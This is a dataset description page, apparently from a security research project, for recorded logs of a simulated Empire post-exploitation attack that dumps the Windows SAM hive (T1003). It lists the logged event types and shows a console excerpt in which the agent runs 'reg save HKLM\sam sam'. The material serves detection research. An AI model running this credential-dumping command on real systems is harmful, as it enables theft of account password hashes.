# Empire Reg Dump SAM

An adversary with administrator privileges can use the windows reg utility to dump the SAM registry hive.

## Technique(s) ID

T1003

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_reg_dump_sam.tar.gz](./empire_reg_sam.tar.gz)

## Network Environment

Shire

## Time Taken

2019-06-25133822

## About this file

| log_name                                   | source_name                         | task                                                   |   record_number |
|--------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                         | PowerShell                          | Pipeline Execution Details                             |             290 |
| System                                     | Service Control Manager             | na                                                     |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | Removable Storage                                      |             149 |
| Security                                   | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |             149 |
| Security                                   | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |             143 |
| Security                                   | Microsoft-Windows-Security-Auditing | Handle Manipulation                                    |              52 |
| Security                                   | Microsoft-Windows-Security-Auditing | Registry                                               |              27 |
| Security                                   | Microsoft-Windows-Security-Auditing | Detailed File Share                                    |              14 |
| Security                                   | Microsoft-Windows-Security-Auditing | Group Membership                                       |              10 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logoff                                                 |              10 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logon                                                  |              10 |
| Security                                   | Microsoft-Windows-Security-Auditing | Special Logon                                          |              10 |
| Security                                   | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                |               7 |
| Security                                   | Microsoft-Windows-Security-Auditing | Authorization Policy Change                            |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | File System                                            |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Creation                                       |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | File Share                                             |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Termination                                    |               1 |
| Microsoft-Windows-WMI-Activity/Operational | Microsoft-Windows-WMI-Activity      | na                                                     |               1 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |             178 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |             118 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |              93 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |              61 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |              54 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |              40 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |               3 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |               3 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Created (rule: PipeEvent)                         |               1 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process terminated (rule: ProcessTerminate)            |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |             241 |

## Attacker Activity

```
(Empire: Y298VW3B) > shell reg save HKLM\sam sam
[*] Tasked Y298VW3B to run TASK_SHELL
[*] Agent Y298VW3B tasked with task ID 5
(Empire: Y298VW3B) > The operation completed successfully.

..Command execution completed.

(Empire: Y298VW3B) >
```